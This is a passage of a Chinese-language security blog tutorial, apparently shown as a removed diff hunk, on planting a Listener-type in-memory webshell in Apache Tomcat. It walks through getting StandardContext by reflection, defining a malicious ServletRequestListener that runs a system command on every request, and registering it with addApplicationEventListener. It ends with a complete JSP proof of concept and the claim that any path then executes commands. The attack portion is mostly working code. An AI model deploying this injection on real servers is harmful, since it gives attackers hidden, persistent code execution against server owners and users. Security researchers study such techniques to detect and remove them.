function_">setAttribute</span>(<span class="title class_">RequestDispatcher</span>.<span class="property">ERROR_EXCEPTION</span>, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们现在就要想，向这个数组中去添加我们的恶意listener</p>
-<p><font style="color:rgb(80, 80, 92);">我们可以通过 </font><code>StandardContext#addApplicationEventListener()</code><font style="color:rgb(80, 80, 92);"> 方法来添加 Listener</font></p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span>(<span class="params"><span class="built_in">Object</span> listener</span>) &#123;</span><br><span class="line">        applicationEventListenersList.<span class="title function_">add</span>(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><font style="color:rgb(80, 80, 92);background-color:rgb(247, 247, 247);">到这一步的调试就没有内容了，所以这里的逻辑有应该是和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。</font></p>
-</blockquote>
-<h2 id="GXNsR">实现</h2>
-要实现内存马的注入，有以下两步
-
-<ul>
-<li>在Listener中的<code>requestInitialized()</code><font style="color:rgb(80, 80, 92);"> 方法里面写入恶意代码</font></li>
-<li><font style="color:rgb(80, 80, 92);">通过 StandardContext 类的 </font><code>addApplicationEventListener()</code><font style="color:rgb(80, 80, 92);"> 方法把恶意的 Listener 放进去</font></li>
-</ul>
-<p><font style="color:rgb(80, 80, 92);">首先和前两个内存马一样，通过反射来获取</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;StandardContext&lt;/font&gt;</code></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br></pre></td></tr></table></figure>
-
-<p>接下来定义我们的恶意Listener</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后就要实例化内存马，并<font style="color:rgb(80, 80, 92);">添加监听器</font></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最终poc</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();</span><br><span class="line">  <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Shell_Listener</span> <span class="variable">shellListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">  standardContext.addApplicationEventListener(shellListener);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>将tomcat服务启动后，访问<code>addListener.jsp</code>，将恶意filter注册进tomcat，后续访问任何一个路径，都可以成功执行命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740060142864-8339537b-35c4-4468-b6d8-7254f475520a.png"></p>
 
       
     </div>
